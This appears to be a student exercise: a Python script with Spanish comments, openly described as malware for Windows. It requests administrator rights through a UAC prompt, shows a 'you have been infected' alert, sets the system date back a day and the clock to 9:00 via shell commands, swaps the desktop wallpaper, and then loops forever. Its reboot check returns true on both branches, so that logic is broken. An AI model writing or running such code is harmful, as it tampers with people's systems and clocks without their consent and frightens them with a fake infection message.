#2-    Cuando usuario reinicie el equipo,
# el malware modifique la fecha y hora del sistema,
# atrasándole un día y cambie el fondo de pantallas por una imagen
# que diga “USTED HA SIDO INFECTADO”

import psutil
import ctypes
import os
import datetime

if not ctypes.windll.shell32.IsUserAnAdmin():
    print('Not enough priviledge, restarting...')
    import sys
    ctypes.windll.shell32.ShellExecuteW(
        None, 'runas', sys.executable, ' '.join(sys.argv), None, None)
else:
    print('Elevated privilege acquired')

def check_system_reboot():
    # Obtener el tiempo de inicio del sistema
    boot_time = psutil.boot_time()
    boot_time = datetime.datetime.fromtimestamp(boot_time)

    # Obtener la hora actual
    current_time = datetime.datetime.now()

    # Calcular la diferencia entre la hora actual y el tiempo de inicio del sistema
    time_difference = current_time - boot_time
    # Comprobar si la diferencia de tiempo es menor a 20 minutos
    if time_difference.total_seconds() < (20 * 60):
        # Mostrar un mensaje en pantalla
        return True
    else:
        return True


if check_system_reboot():
    # Definir el mensaje a mostrar
    message = "Usted ha sido infectado."
    # Mostrar el mensaje en pantalla
    ctypes.windll.user32.MessageBoxW(0, message, "Alerta", 0x30 | 0x0)
    # Obtener la fecha y hora actual
    now = datetime.datetime.now()
    # Restar un día a la fecha y hora actual
    yesterday = now - datetime.timedelta(days=1)
    # Cambiar la fecha del sistema a la fecha de ayer
    date_cmd = "date " + yesterday.strftime("%m/%d/%Y")
    os.system(date_cmd)
    # Cambiar la hora del sistema a las 9:00 AM
    time_cmd = "time 09:00:00"
    os.system(time_cmd)
    # Imprimir el mensaje en la consola
    print(message)
    # Ruta de la imagen a utilizar como fondo de pantalla
    image_path = "C:/Users/vicjo/OneDrive/Escritorio/SosftDev/istockphoto-500963070-612x612.jpg"
    # Establecer el fondo de pantalla utilizando la API de Windows
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 0)

# Mantenemos el programa en ejecución
while True:
    pass